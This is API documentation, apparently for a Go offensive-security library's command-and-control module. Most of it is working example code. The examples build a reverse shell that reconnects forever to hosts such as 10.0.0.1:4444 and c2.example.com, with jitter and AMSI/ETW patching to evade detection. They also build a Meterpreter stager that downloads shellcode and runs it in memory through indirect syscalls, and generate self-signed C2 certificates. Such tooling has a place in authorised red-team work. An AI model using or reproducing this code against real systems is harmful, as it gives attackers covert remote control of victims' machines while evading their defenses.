# Command and Control

[<- Back to README](../README.md)

The `c2/` module provides everything needed to build a reverse shell or Meterpreter stager: pluggable transports (TCP/TLS), a reconnecting shell with evasion integration, Metasploit staging for both Windows and Linux, and self-signed certificate generation with fingerprint pinning.

## Packages

| Package | Description | MITRE ATT&CK | Platform |
|---------|-------------|---------------|----------|
| `c2/transport` | TCP/TLS transport with certificate pinning | -- | Cross-platform |
| `c2/shell` | Reverse shell with reconnection, PTY, evasion | T1059 -- Command and Scripting Interpreter | Cross-platform |
| `c2/meterpreter` | Meterpreter stager (TCP/HTTP/HTTPS) | T1059 -- Command and Scripting Interpreter | Cross-platform |
| `c2/cert` | Self-signed X.509 certificate generation | -- | Cross-platform |

## c2/transport -- Transport Interface and Implementations

### Transport Interface

Every transport implements `Transport`, which embeds `io.ReadWriteCloser` and adds connection management:

```go
type Transport interface {
    io.ReadWriteCloser
    Connect(ctx context.Context) error
    RemoteAddr() net.Addr
}
```

The shell and other consumers program against this interface, so swapping TCP for TLS (or a future HTTP transport) requires no code changes.

### NewTCP

Creates a plain TCP transport.

**Purpose:** Unencrypted reverse connection for lab/testing or when TLS is handled externally.

**Parameters:**
- `address` (string) -- Host and port in `"host:port"` format.
- `timeout` (time.Duration) -- Dial timeout. The dialer aborts if the TCP handshake does not complete within this window.

**Returns:** `*TCPTransport` (implements `Transport`).

**How it works:** `Connect` uses `net.Dialer.DialContext` with the configured timeout. If a prior connection exists, it is closed first. `Read`/`Write` delegate to the underlying `net.Conn`; both return `io.ErrClosedPipe` if called before `Connect`.

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/transport"
)

trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)
if err := trans.Connect(context.Background()); err != nil {
    log.Fatal(err)
}
defer trans.Close()

trans.Write([]byte("hello from implant"))
```

### NewTLS

Creates a TLS transport with optional client certificates and certificate pinning.

**Purpose:** Encrypted C2 channel. Certificate pinning prevents MITM even when the server uses a self-signed cert.

**Parameters:**
- `address` (string) -- Host and port.
- `timeout` (time.Duration) -- Dial timeout for the underlying TCP connection.
- `certPath` (string) -- Path to PEM client certificate (pass `""` to skip client auth).
- `keyPath` (string) -- Path to PEM client private key (pass `""` to skip client auth).
- `opts` (...TLSOption) -- Functional options:
  - `WithInsecure(true)` -- Disables server certificate chain verification (still verifies fingerprint if set).
  - `WithFingerprint(fp)` -- Pins the server certificate by SHA-256 fingerprint (hex-encoded, uppercase). The fingerprint is checked inside `VerifyPeerCertificate`, which runs even when `InsecureSkipVerify` is true.

**Returns:** `*TLSTransport` (implements `Transport`).

**How it works:** `Connect` first dials a raw TCP connection, then wraps it with `tls.Client` and performs the handshake within the context deadline. If a fingerprint is configured, `VerifyPeerCertificate` parses the first raw certificate from the server, computes `SHA256(cert.Raw)`, and compares it to the pinned value. A mismatch fails the handshake.

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/transport"
    "github.com/oioio-space/maldev/c2/cert"
)

// Generate a cert and compute its fingerprint
cert.Generate(nil, "server.pem", "server-key.pem")
fp, _ := cert.Fingerprint("server.pem")

// Connect with pinning (insecure=true skips CA check, but fingerprint is still enforced)
trans := transport.NewTLS(
    "10.0.0.1:443",
    10*time.Second,
    "client.pem", "client-key.pem",
    transport.WithInsecure(true),
    transport.WithFingerprint(fp),
)

if err := trans.Connect(context.Background()); err != nil {
    log.Fatal(err) // fails if fingerprint does not match
}
defer trans.Close()
```

### New (Factory)

Creates the appropriate transport from a `Config` struct.

**Purpose:** Configuration-driven transport selection -- useful when the transport type comes from a config file or build flag.

**Parameters:**
- `cfg` (*Config) -- Fields:
  - `Address` -- Host:port.
  - `Timeout` -- Dial timeout.
  - `UseTLS` -- When true, creates a TLS transport; otherwise TCP.
  - `TLSCertPath`, `TLSKeyPath` -- Client certificate paths.
  - `TLSInsecure` -- Skip server cert verification.
  - `TLSFingerprint` -- SHA-256 pin.

**Returns:** `(Transport, error)`.

```go
trans, err := transport.New(&transport.Config{
    Address:        "10.0.0.1:443",
    Timeout:        10 * time.Second,
    UseTLS:         true,
    TLSInsecure:    true,
    TLSFingerprint: "AABBCC...",
})
```

## c2/shell -- Reverse Shell

### Config

```go
type Config struct {
    ShellPath     string             // binary path (default: cmd.exe / /bin/sh)
    ShellArgs     []string           // extra args passed to the shell
    MaxRetries    int                // 0 = unlimited reconnection
    ReconnectWait time.Duration      // base delay between retries
    Evasion       []evasion.Technique // evasion patches applied on Start (Windows only)
}
```

- **ShellPath / ShellArgs** -- Override the shell binary. On Windows, defaults to `cmd.exe`. On Linux/macOS, defaults to `/bin/sh`.
- **MaxRetries** -- Maximum reconnection attempts. `0` means the shell retries forever until the context is cancelled or `Stop()` is called.
- **ReconnectWait** -- Base wait between retries. The reconnect loop uses exponential backoff (doubling up to 5 minutes) with +/-25% jitter to avoid beacon fingerprinting.
- **Evasion** -- A slice of `evasion.Technique` values. On Windows, these are applied once at the start of `Start()` via `evasion.ApplyAll`. On non-Windows platforms, this field is ignored.

### DefaultConfig

Returns a sensible default: `cmd.exe` on Windows, `/bin/sh` elsewhere, unlimited retries, 5-second base reconnect wait, no evasion.

### New

```go
func New(trans transport.Transport, cfg *Config) *Shell
```

**Purpose:** Creates a `Shell` bound to a transport. Pass `nil` for `cfg` to use `DefaultConfig()`.

### Start

```go
func (s *Shell) Start(ctx context.Context) error
```

**Purpose:** Runs the reverse shell. Blocks until the context is cancelled, `Stop()` is called, or `MaxRetries` is exceeded.

**How the reconnection loop works:**

1. On first call, applies evasion techniques (Windows only).
2. Attempts an immediate session (connect + shell).
3. On failure, enters the backoff loop:
   - Computes wait = `currentWait + jitter` (jitter is random +/-25% of currentWait).
   - Waits for the timer, context cancellation, or stop signal.
   - On failure, doubles `currentWait` (capped at 5 minutes).
   - On success, resets `currentWait` to `ReconnectWait` and `retries` to 0.

**Session execution:**
- **Windows:** Binds `cmd.exe` stdin/stdout/stderr directly to the transport (`runDirect`).
- **Linux/macOS:** Spawns the shell inside a pseudo-terminal via the `creack/pty` library, then copies bidirectionally between the PTY and the transport.

### Stop

```go
func (s *Shell) Stop() error
```

Gracefully signals the reconnect loop to exit. Returns an error if the shell is not running.

### Wait

```go
func (s *Shell) Wait()
```

Blocks until the shell terminates (Start returns).

### IsRunning

```go
func (s *Shell) IsRunning() bool
```

Thread-safe check using `atomic.Bool`.

### PatchDefenses (Windows only)

```go
func PatchDefenses() error
```

Applies the full `preset.Stealth()` evasion suite (AMSI, ETW, etc.) as a standalone call.

### IsAdmin (Windows only)

```go
func IsAdmin() bool
```

Checks if the current process token is a member of the Administrators SID (`S-1-5-32-544`).

### Complete Example

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/c2/transport"
    "github.com/oioio-space/maldev/evasion/preset"
)

func main() {
    trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)

    cfg := &shell.Config{
        MaxRetries:    0,                // retry forever
        ReconnectWait: 5 * time.Second,
        Evasion:       preset.Stealth(), // patch AMSI + ETW on Windows
    }

    sh := shell.New(trans, cfg)
    if err := sh.Start(context.Background()); err != nil {
        // MaxRetries exceeded or context cancelled
    }
}
```

## c2/meterpreter -- Metasploit Stager

### Staging Protocol

The Meterpreter stager connects to a Metasploit handler and receives the second-stage payload. The protocol differs by platform:

**Windows (4-byte size prefix):**
1. Connect to the handler via TCP/HTTP/HTTPS.
2. Read 4 bytes (little-endian uint32) = payload size.
3. Read exactly that many bytes = the stage (raw shellcode, typically 200-400 KB).
4. Allocate RW memory via `VirtualAlloc` (or `NtAllocateVirtualMemory` if a syscall Caller is provided).
5. Copy shellcode into the allocation.
6. Re-protect as RX (`PAGE_EXECUTE_READ`) -- avoids ever having RWX memory.
7. Create a thread at the shellcode entry point.
8. Wait for the thread (blocks indefinitely -- the Meterpreter session runs until killed).

**Linux (126-byte wrapper):**
1. Connect to the handler via TCP.
2. Read exactly 126 bytes = wrapper shellcode (no size prefix).
3. The wrapper is designed to read the full ELF payload from the same socket.
4. Extract the raw socket file descriptor from the `net.TCPConn`.
5. Store the `*os.File` globally to prevent GC from closing the fd.
6. Execute the wrapper via `purego.SyscallN` (respects System V AMD64 ABI).

### Config

```go
type Config struct {
    Transport   Transport     // "tcp", "http", "https"
    Host        string        // handler IP/hostname
    Port        string        // handler port
    Timeout     time.Duration // connection timeout
    TLSInsecure bool          // allow self-signed certs for HTTPS
    Caller      any           // *wsyscall.Caller or nil for standard WinAPI
}
```

- **Caller** is typed as `any` for cross-platform compilation. On Windows, it is type-asserted to `*wsyscall.Caller`. When non-nil, `VirtualAlloc`, `VirtualProtect`, and `CreateThread` are replaced with their NT equivalents (`NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`) routed through the caller's chosen syscall method.

### NewStager

```go
func NewStager(cfg *Config) *Stager
```

Creates a stager with the given configuration.

### Stage

```go
func (s *Stager) Stage(ctx context.Context) error
```

**Purpose:** Fetches and executes the Meterpreter stage. This is a blocking call -- on Windows it waits for the Meterpreter thread to exit; on Linux the wrapper takes over execution.

**Validation:**
- Rejects payloads larger than 500 KB (likely stageless instead of staged -- a common misconfiguration).
- Rejects payloads smaller than 50 bytes (invalid/empty stage).

### PayloadName

```go
func PayloadName(transport Transport) string
```

**Purpose:** Returns the correct Metasploit payload name for the current `GOOS`/`GOARCH` and transport. Useful for generating `msfconsole` handler configuration.

**Returns:** e.g., `"windows/x64/meterpreter/reverse_tcp"`, `"linux/x64/meterpreter/reverse_tcp"`.

### HTTP/HTTPS Staging

For HTTP/HTTPS, the stager sends a GET request to `http(s)://host:port/` with a `Mozilla/5.0` User-Agent. The response body is the raw stage (no 4-byte prefix). Responses are limited to 10 MB.

### Example: Windows TCP Stager

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/meterpreter"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

func main() {
    // Use indirect syscalls for stealth
    caller := wsyscall.New(
        wsyscall.MethodIndirect,
        wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()),
    )

    stager := meterpreter.NewStager(&meterpreter.Config{
        Transport:   meterpreter.TransportTCP,
        Host:        "10.0.0.1",
        Port:        "4444",
        Timeout:     30 * time.Second,
        Caller:      caller,
    })

    // On the handler side:
    // use exploit/multi/handler
    // set payload windows/x64/meterpreter/reverse_tcp
    // set LHOST 10.0.0.1
    // set LPORT 4444

    if err := stager.Stage(context.Background()); err != nil {
        // handle error
    }
}
```

## c2/cert -- Certificate Generation

### Config

```go
type Config struct {
    Organization string // X.509 Organization field (default: "C2")
    CommonName   string // X.509 CN field (default: "localhost")
    ValidDays    int    // certificate validity in days (default: 3650 = 10 years)
    KeySize      int    // RSA key size in bits (default: 4096)
}
```

### DefaultConfig

Returns: Organization="C2", CommonName="localhost", 10-year validity, 4096-bit RSA key.

### Generate

```go
func Generate(cfg *Config, certPath, keyPath string) error
```

**Purpose:** Creates a self-signed X.509 certificate and RSA private key, writing them as PEM files.

**Parameters:**
- `cfg` (*Config) -- Pass `nil` for defaults.
- `certPath` (string) -- Output path for the certificate PEM. Parent directories are created automatically.
- `keyPath` (string) -- Output path for the private key PEM (written with mode 0600).

**How it works:**
1. Generates an RSA key of `cfg.KeySize` bits.
2. Creates a 128-bit random serial number.
3. Builds an X.509 template with `KeyUsageKeyEncipherment | KeyUsageDigitalSignature` and both server and client auth extended key usages.
4. Self-signs the certificate (issuer = subject).
5. PEM-encodes both the certificate (type "CERTIFICATE") and key (type "RSA PRIVATE KEY").

```go
import "github.com/oioio-space/maldev/c2/cert"

err := cert.Generate(&cert.Config{
    Organization: "RedTeam",
    CommonName:   "c2.internal",
    ValidDays:    365,
    KeySize:      2048, // faster generation, fine for C2
}, "certs/server.pem", "certs/server-key.pem")
```

### Fingerprint

```go
func Fingerprint(certPath string) (string, error)
```

**Purpose:** Computes the SHA-256 fingerprint of a PEM certificate file.

**Returns:** Uppercase hex string (e.g., `"A1B2C3..."`). This is the value you pass to `transport.WithFingerprint()`.

**How it works:** Reads the PEM file, decodes the first block, parses the X.509 certificate, then computes `SHA256(cert.Raw)`.

```go
fp, err := cert.Fingerprint("certs/server.pem")
// fp = "A1B2C3D4E5..."

// Use it for certificate pinning
trans := transport.NewTLS("10.0.0.1:443", 10*time.Second, "", "",
    transport.WithInsecure(true),
    transport.WithFingerprint(fp),
)
```

### Complete Example: Generate + Pin + Connect

```go
import (
    "context"
    "time"

    "github.com/oioio-space/maldev/c2/cert"
    "github.com/oioio-space/maldev/c2/shell"
    "github.com/oioio-space/maldev/c2/transport"
)

func main() {
    // Generate cert (do this on the server side)
    cert.Generate(nil, "server.pem", "server-key.pem")
    fp, _ := cert.Fingerprint("server.pem")

    // Build a TLS transport with fingerprint pinning
    trans := transport.NewTLS(
        "c2.example.com:443",
        15*time.Second,
        "", "", // no client cert
        transport.WithInsecure(true),
        transport.WithFingerprint(fp),
    )

    // Start a reconnecting reverse shell over TLS
    sh := shell.New(trans, &shell.Config{
        MaxRetries:    0,
        ReconnectWait: 10 * time.Second,
    })
    sh.Start(context.Background())
}
```
